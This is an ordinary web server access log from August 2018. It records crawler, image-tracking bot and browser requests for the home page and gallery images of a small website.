193.90.12.118 - - [02/Aug/2018:08:39:17 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
46.229.168.73 - - [02/Aug/2018:08:45:46 -0700] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
46.229.168.74 - - [02/Aug/2018:08:45:54 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
35.204.85.149 - - [02/Aug/2018:08:46:35 -0700] "GET /img/mixman/thumbs/7.jpg HTTP/1.1" 200 29010 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.250.197 - - [02/Aug/2018:08:54:49 -0700] "GET /img/wu-wei/thumbs/1.jpg HTTP/1.1" 200 35144 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.42.215 - - [02/Aug/2018:09:33:36 -0700] "GET /img/mixman/thumbs/15.jpg HTTP/1.1" 200 31677 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.253.228 - - [02/Aug/2018:09:50:26 -0700] "GET /img/mixman/13.jpg HTTP/1.1" 200 106423 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.54.232 - - [02/Aug/2018:09:59:32 -0700] "GET /img/sfnoir/thumbs/5.jpg HTTP/1.1" 200 18532 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
46.76.28.55 - - [02/Aug/2018:10:17:54 -0700] "GET /img/autumn/thumbs/2.jpg HTTP/1.1" 200 45196 "https://www.google.pl/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
54.36.149.72 - - [02/Aug/2018:10:19:47 -0700] "GET /img/bs4w/5.jpg HTTP/1.1" 200 42135 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
35.204.250.197 - - [02/Aug/2018:10:23:35 -0700] "GET /img/mixman/thumbs/13.jpg HTTP/1.1" 200 28845 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.92.146 - - [02/Aug/2018:10:28:19 -0700] "GET /img/bs4w/4.jpg HTTP/1.1" 200 93892 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
93.158.161.62 - - [02/Aug/2018:10:48:02 -0700] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
93.158.161.62 - - [02/Aug/2018:10:48:02 -0700] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
93.158.161.62 - - [02/Aug/2018:10:48:05 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.14 - - [02/Aug/2018:10:48:06 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.172 - - [02/Aug/2018:10:48:11 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.172 - - [02/Aug/2018:10:48:13 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
35.204.253.228 - - [02/Aug/2018:10:58:32 -0700] "GET /img/autumn/5.jpg HTTP/1.1" 200 180877 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
217.182.168.178 - - [02/Aug/2018:11:27:08 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
35.204.253.228 - - [02/Aug/2018:11:32:36 -0700] "GET /img/mixman/thumbs/8.jpg HTTP/1.1" 200 31534 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.153.207 - - [02/Aug/2018:11:58:48 -0700] "GET /img/mixman/7.jpg HTTP/1.1" 200 107323 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.153.207 - - [02/Aug/2018:12:14:26 -0700] "GET /img/urban-cowgirl/thumbs/6.jpg HTTP/1.1" 200 14645 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
58.19.4.187 - - [02/Aug/2018:12:27:23 -0700] "GET /README.md HTTP/1.1" 404 207 "-" "-"
35.205.141.8 - - [02/Aug/2018:12:47:03 -0700] "HEAD / HTTP/1.1" 200 - "-" "-"
35.205.141.8 - - [02/Aug/2018:12:47:04 -0700] "GET / HTTP/1.1" 200 72658 "-" "-"
